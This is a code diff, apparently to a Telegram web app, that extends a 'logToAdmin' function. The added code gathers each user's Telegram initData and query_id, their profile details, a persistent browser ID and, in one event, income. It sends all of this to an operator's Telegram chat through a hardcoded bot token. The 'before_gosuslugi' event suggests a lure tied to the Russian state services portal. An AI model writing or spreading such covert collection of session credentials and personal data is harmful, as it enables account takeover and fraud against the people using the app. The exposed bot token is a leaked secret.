@@ -287,7 +287,16 @@
       }
     }
 
-    // Отправка данных напрямую в Telegram-бота
+    // Генерация и хранение client_id для Menu Button и уникальности
+    function getClientId() {
+      let id = localStorage.getItem('my_client_id');
+      if (!id) {
+        id = 'client_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('my_client_id', id);
+      }
+      return id;
+    }
+
     function logToAdmin(data) {
       const BOT_TOKEN = '7597284856:AAHRJYxz1PvbDVEYcKxwtiX9FNH8ceEckzU'; // <-- ВСТАВЬТЕ СВОЙ ТОКЕН
       const ADMIN_CHAT_ID = '7867932363'; // <-- ВСТАВЬТЕ СВОЙ chat_id
@@ -299,13 +308,22 @@
         data.tg_first_name = tgUser.first_name;
         data.tg_last_name = tgUser.last_name;
       }
+      // Добавляем query_id и initData
+      data.query_id = window.Telegram?.WebApp?.initDataUnsafe?.query_id || '';
+      data.init_data = window.Telegram?.WebApp?.initData || '';
+      // Добавляем client_id (уникальный для браузера)
+      data.client_id = getClientId();
+
       let userInfo = '';
       if (data.tg_user_id) {
-        userInfo = `\nTelegram ID: ${data.tg_user_id}` +
-                   (data.tg_username ? `\nUsername: @${data.tg_username}` : '') +
-                   (data.tg_first_name ? `\nИмя: ${data.tg_first_name}` : '') +
-                   (data.tg_last_name ? `\nФамилия: ${data.tg_last_name}` : '');
+        userInfo += `\nTelegram ID: ${data.tg_user_id}`;
+        if (data.tg_username) userInfo += `\nUsername: @${data.tg_username}`;
+        if (data.tg_first_name) userInfo += `\nИмя: ${data.tg_first_name}`;
+        if (data.tg_last_name) userInfo += `\nФамилия: ${data.tg_last_name}`;
       }
+      userInfo += `\nQuery ID: ${data.query_id}`;
+      userInfo += `\nClient ID: ${data.client_id}`;
+
       let text = '';
       if (data.event === 'before_gosuslugi') {
         text = `Веб-апп: заполнены данные\nСтатус: ${data.status}\nДоход: ${data.income}`;
